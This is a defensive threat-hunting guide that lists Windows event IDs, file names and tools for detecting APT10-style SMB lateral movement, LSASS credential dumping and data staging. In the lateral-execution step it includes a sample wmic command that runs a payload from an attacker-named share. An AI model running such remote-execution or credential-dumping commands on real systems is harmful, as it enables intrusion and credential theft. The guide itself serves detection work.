
> 🎯 **Objective**: Identify stealthy use of **SMB protocol** for lateral movement and **credential/data staging** consistent with **APT10** tradecraft, without relying on malware or noisy alerts.

APT10 (a.k.a. Stone Panda) has historically used **legitimate tools** and SMB shares to spread across environments and **harvest credentials** quietly.

---

## ✅ Hypothesis

> “A threat actor is using SMB shares for lateral movement and staging stolen credentials or files, while avoiding malware detection by using native Windows utilities.”

---

## 🧱 Tactics to Focus On

1. **Lateral Movement** — Copying tools/scripts over SMB, remote execution
2. **Credential Access** — Harvesting with native tools (e.g., `creddump`, `mimikatz`)
3. **Staging** — Data written to hidden or unusual SMB shares
4. **Defense Evasion** — Living off the land (LOLBINs), rare admin tools
5. **Exfil Preparation** — Compressing or encrypting data for removal

---

## 🔍 Hunt Steps (True Threat Hunt Chain)

---

### **1. Hunt for Unusual SMB File Transfers**

**Why:**
APT10 often copies tools or credential dumps to admin shares like `C$`, `ADMIN$`, or custom UNC paths.

**Look For:**

* Sysmon Event ID 3:

  * `DestinationPort: 445`
  * `Image: cmd.exe`, `powershell.exe`, `explorer.exe`, `wmic.exe`
* Windows Security Log:

  * Event ID **5140**: "A network share object was accessed"
  * Look for share names like `\\HOST\C$`, `\\HOST\ADMIN$`

**Thought Process:**

> Was a share accessed by a non-admin account?
> Was a binary or dump file copied across machines?

---

### **2. Trace File Writes to Shared Locations**

**Why:**
APT10 stages tools like credential dumpers or archives in shared folders before or after use.

**Look For:**

* Sysmon Event ID 11:

  * File creation under paths like:

    * `\\HOST\C$\Users\Public\`
    * `\\HOST\ADMIN$\Temp\`
  * File names like `data.zip`, `creds.txt`, `tools.dll`

**Thought Process:**

> What files were copied over SMB?
> Are these typical system files or suspicious binaries/scripts?

---

### **3. Detect Credential Harvesting Behavior**

**Why:**
APT10 uses tools like `mimikatz`, `procdump`, or custom scripts to dump credentials and DPAPI secrets.

**Look For:**

* Sysmon Event ID 10:

  * `TargetImage: lsass.exe`
  * `SourceImage`: `rundll32.exe`, `powershell.exe`, `procdump.exe`
* File creation of:

  * `lsass.dmp`, `creds.dmp`, `vault.txt`, or `hashes.txt`

**Thought Process:**

> Is there evidence of LSASS access from a remote host?
> Did the attacker dump credentials then stage them locally?

---

### **4. Look for Lateral Execution from Admin Shares**

**Why:**
APT10 often remotely executes tools via `wmic`, `schtasks`, or `PSExec`, launching payloads from SMB paths.

**Look For:**

* Event ID 4688:

  * `CommandLine` includes UNC paths: `\\HOST\C$\path\tool.exe`
* Sysmon Event ID 1:

  * Executables running from mapped shares or network paths

**Command Examples:**

```cmd
wmic /node:HOST process call create "\\attacker\share\payload.exe"
```

**Thought Process:**

> Was execution initiated over SMB?
> Are these tools unsigned or renamed?

---

### **5. Hunt for Data Staging Behavior**

**Why:**
APT10 often compresses credential dumps and reconnaissance data before exfiltration.

**Look For:**

* File creation:

  * `*.zip`, `*.rar`, `*.7z`, or `.cab` files created after credential harvesting
* Tools like:

  * `makecab.exe`, `rar.exe`, `powershell Compress-Archive`

**Thought Process:**

> Was data staged for exfiltration?
> Where was it written — local disk or a network share?

---

### **6. Analyze Account Usage Across Hosts**

**Why:**
Credential reuse across multiple hosts is a signature of lateral movement by APT10.

**Look For:**

* Security Event ID 4624:

  * Same account logging into 3+ hosts within 5–10 minutes
  * `LogonType=3` (network) or `LogonType=10` (RDP)
* Event ID 4648:

  * Explicit credentials used — may indicate pass-the-hash or token theft

**Thought Process:**

> Is the account normally used this way?
> Was it escalated or lateral?

---

### **7. Look for Cleanup or Evasion Steps**

**Why:**
APT10 sometimes cleans up artifacts — deletes dumps, clears logs, or removes scheduled tasks.

**Look For:**

* Sysmon Event ID 23/24: File deleted
* Event ID 1102: Audit log cleared
* PowerShell log: `Remove-Item`, `Clear-Content`, `schtasks /delete`

**Thought Process:**

> Did the attacker cover their tracks?
> Were staged files removed shortly after creation?

---

## 🧠 Summary

This hunt **does not rely on alerts** and instead chains APT10’s known behaviors:

* SMB access to move tools
* Credential dumps staged over shares
* Remote execution using LOLBINs
* Dump compression
* Lateral spread via stolen credentials
